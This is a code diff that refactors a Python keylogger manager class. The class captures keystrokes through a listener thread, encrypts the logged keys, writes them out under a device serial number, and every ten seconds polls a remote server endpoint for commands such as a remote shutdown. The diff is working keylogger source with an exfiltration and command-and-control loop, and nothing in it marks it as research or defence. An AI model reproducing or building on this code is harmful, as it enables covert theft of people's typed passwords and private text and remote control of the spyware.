@@ -17,7 +17,7 @@ class KeyLoggerManager(IKeyLoggerManager):
         self.__encryptor = Encryptor(key)
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
-        self.__send_data_thread = threading.Thread(target=self.__send_data)
+        self.__send_data_thread = threading.Thread(target=self.write_main_loop)
 
     def start_logging(self):
         self.__is_logging = True
@@ -38,28 +38,23 @@ class KeyLoggerManager(IKeyLoggerManager):
         with Listener(on_press=self.__key_logger.on_press) as self.listener:
             self.listener.join()
 
-    def __send_data(self):
+    def write_main_loop(self):
         while self.__is_logging:
-            data = self.__key_logger.get_logged_keys()
-            encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in
-                            data.items()}
-            self.__writer.write(self.__serial_number, encrypt_data)
-            self.__key_logger.clear_logged_keys()
-
-            try:
-                response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
-                if response.status_code == 200:
-                    commands = response.json().get('commands', {})
-                    if commands.get('shutdown', False):
-                        self.stop_logging()
-            except requests.exceptions.RequestException:
-                pass
-
+            self.__encrypt_and_send_data()
+            self.check_commands()
             time.sleep(10)
 
-    def print_keys(self):
-        logged_keys = self.__key_logger.get_logged_keys()
-        self.__key_logger.clear_logged_keys()
-        for key, value in logged_keys.items():
-            print(key)
-            print(value)
+    def check_commands(self):
+        try:
+            response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
+            if response.status_code == 200:
+                commands = response.json().get('commands', {})
+                if commands.get('shutdown', False):
+                    self.stop_logging()
+        except requests.exceptions.RequestException:
+            pass
+
+    def __encrypt_and_send_data(self):
+        data = self.__key_logger.get_logged_keys()
+        encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in data.items()}
+        self.__writer.write(self.__serial_number, encrypt_data)
